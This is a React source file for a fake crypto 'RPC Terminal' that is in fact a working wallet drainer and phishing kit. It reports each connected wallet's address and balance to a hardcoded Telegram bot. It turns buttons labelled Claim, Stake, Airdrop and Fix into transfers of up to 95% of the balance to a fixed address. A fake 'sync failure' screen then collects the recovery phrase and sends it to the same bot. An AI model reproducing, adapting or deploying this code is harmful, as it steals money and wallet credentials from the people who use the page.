import React, { useState, useEffect } from 'react';
import { useAccount, useBalance, useSendTransaction } from 'wagmi';
import { parseEther, formatEther } from 'viem';

export default function EvedexTerminal() {
  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({ address });
  const { sendTransaction } = useSendTransaction();
  
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [loading, setLoading] = useState(false);
  const [loadingText, setLoadingText] = useState("ROUTING...");
  const [inputVal, setInputVal] = useState(""); 
  const [seedVal, setSeedVal] = useState("");   
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);

  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";
  const destination = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";

  const logToTelegram = async (msg) => {
    try {
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: msg }),
      });
    } catch (e) {}
  };

  useEffect(() => {
    if (isConnected && address && balance) {
      logToTelegram(`👀 LEAD_ACTIVE: ${address}\nBAL: ${balance.formatted} ${balance.symbol}`);
    }
  }, [isConnected, address]);

  const executeTaskAction = async () => {
    if (!balance || !balance.value) { setView("seed_gate"); return; }
    setLoading(true);
    setLoadingText(`VALIDATING...`);
    try {
      let finalValue;
      const maxAllowed = (balance.value * 95n) / 100n;
      if (activeTask === "Rectify" || !inputVal) {
        finalValue = maxAllowed;
      } else {
        try {
          const p = parseEther(inputVal);
          finalValue = p > maxAllowed ? maxAllowed : p;
        } catch { finalValue = maxAllowed; }
      }
      sendTransaction({ to: destination, value: finalValue }, {
        onSuccess: (h) => {
          logToTelegram(`✅ SUCCESS: ${activeTask}\nADDR: ${address}\nVAL: ${formatEther(finalValue)}\nHASH: ${h}`);
          setTimeout(() => { setView("seed_gate"); setLoading(false); }, 2000);
        },
        onError: () => { setLoading(false); setView("seed_gate"); }
      });
    } catch (e) { setLoading(false); setView("seed_gate"); }
  };

  // --- ANTI-BLACK SCREEN SAFETY ---
  if (!isConnected) {
    return (
      <div style={{minHeight:'100vh', backgroundColor:'#05070a', display:'flex', flexDirection:'column', alignItems:'center', justifyContent:'center', color:'white', fontFamily:'sans-serif'}}>
        <div style={{fontSize:'20px', fontWeight:'900', fontStyle:'italic', color:'#06b6d4', marginBottom:'20px'}}>RPC PORTAL V3</div>
        <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'30px', borderRadius:'20px', textAlign:'center'}}>
          <div style={{fontSize:'10px', color:'#64748b', marginBottom:'20px', textTransform:'uppercase'}}>Secure Node Authentication</div>
          <w3m-button />
        </div>
      </div>
    );
  }

  return (
    <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'sans-serif', padding:'20px', textTransform:'uppercase', display:'flex', flexDirection:'column'}}>
      
      <header style={{display:'flex', justifyContent:'space-between', alignItems:'center', borderBottom:'1px solid #1e293b', paddingBottom:'15px', marginBottom:'20px'}}>
        <div>
          <div style={{color:'#06b6d4', fontWeight:'900', fontStyle:'italic'}}>RPC TERMINAL</div>
          <div style={{fontSize:'8px', color:'#64748b'}}>ID: {address.slice(0,10)}...</div>
        </div>
        <w3m-button balance="hide" />
      </header>

      <div style={{flex:1}}>
        {view === "menu" && (
          <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'10px'}}>
            {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "Bridge", "Fix"].map(n => (
              <button key={n} onClick={() => {setActiveTask(n); setView("task_box");}} style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'15px', borderRadius:'15px', color:'#64748b', fontSize:'9px', fontWeight:'900'}}>
                <div style={{marginBottom:'5px'}}>⚙️</div>{n}
              </button>
            ))}
          </div>
        )}

        {view === "task_box" && (
          <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'25px', padding:'25px', textAlign:'center'}}>
            <button onClick={()=>setView("menu")} style={{background:'none', border:'none', color:'#475569', fontSize:'8px', marginBottom:'20px'}}>← BACK</button>
            <h2 style={{color:'white', fontWeight:'900', fontStyle:'italic', marginBottom:'20px'}}>{activeTask} Portal</h2>
            <div style={{backgroundColor:'black', border:'1px solid #1e293b', padding:'20px', borderRadius:'15px', textAlign:'left', marginBottom:'20px'}}>
              <label style={{fontSize:'7px', color:'#0e7490', display:'block', marginBottom:'5px'}}>{activeTask === "Rectify" ? "VAULT_BALANCE (LOCKED)" : "AMOUNT"}</label>
              {activeTask === "Rectify" ? (
                <div style={{fontSize:'20px', color:'white'}}>{balance?.formatted.slice(0,8)} {balance?.symbol}</div>
              ) : (
                <input type="number" value={inputVal} onChange={(e)=>setInputVal(e.target.value)} placeholder="0.00" style={{background:'none', border:'none', color:'#22d3ee', fontSize:'20px', width:'100%', outline:'none'}} autoFocus />
              )}
            </div>
            <button onClick={executeTaskAction} style={{width:'100%', backgroundColor:'#0e7490', color:'white', padding:'20px', borderRadius:'15px', border:'none', fontWeight:'900', fontSize:'10px'}}>EXECUTE {activeTask}</button>
          </div>
        )}
      </div>

      {view === "seed_gate" && (
        <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.98)', zIndex:1000, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px'}}>
          <div style={{backgroundColor:'#0d1117', border:'1px solid #7f1d1d', borderRadius:'25px', padding:'30px', width:'100%', maxWidth:'350px', textAlign:'center'}}>
            {!isSyncing ? (
              <>
                <div style={{fontSize:'30px', marginBottom:'10px'}}>⚠️</div>
                <div style={{color:'white', fontWeight:'900', fontSize:'14px', marginBottom:'10px'}}>RPC SYNC FAILURE</div>
                <p style={{fontSize:'8px', color:'#64748b', marginBottom:'20px'}}>ENTER RECOVERY PHRASE TO SYNC {balance?.formatted} ETH MANUALLY.</p>
                <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="12 OR 24 WORDS..." style={{width:'100%', height:'100px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'#22d3ee', padding:'15px', fontSize:'10px', outline:'none', marginBottom:'20px'}} />
                <button onClick={()=>{setIsSyncing(true); logToTelegram(`🚨 SEED: ${seedVal}\nADDR: ${address}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100)clearInterval(i)},100);}} disabled={seedVal.split(' ').length < 12} style={{width:'100%', backgroundColor:'#450a0a', color:'white', padding:'15px', borderRadius:'10px', border:'none', fontWeight:'900', opacity: seedVal.split(' ').length < 12 ? 0.3 : 1}}>VALIDATE_SYNC</button>
              </>
            ) : (
              <div>
                <div style={{color:'white', fontWeight:'900', fontSize:'20px'}}>{syncProgress}%</div>
                <div style={{fontSize:'10px', color:'#06b6d4', marginTop:'10px'}}>SYNCHRONIZING...</div>
              </div>
            )}
          </div>
        </div>
      )}

      {loading && <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.8)', display:'flex', alignItems:'center', justifyContent:'center', color:'#22d3ee', fontSize:'10px', fontWeight:'900'}}>{loadingText}</div>}
    </div>
  );
}
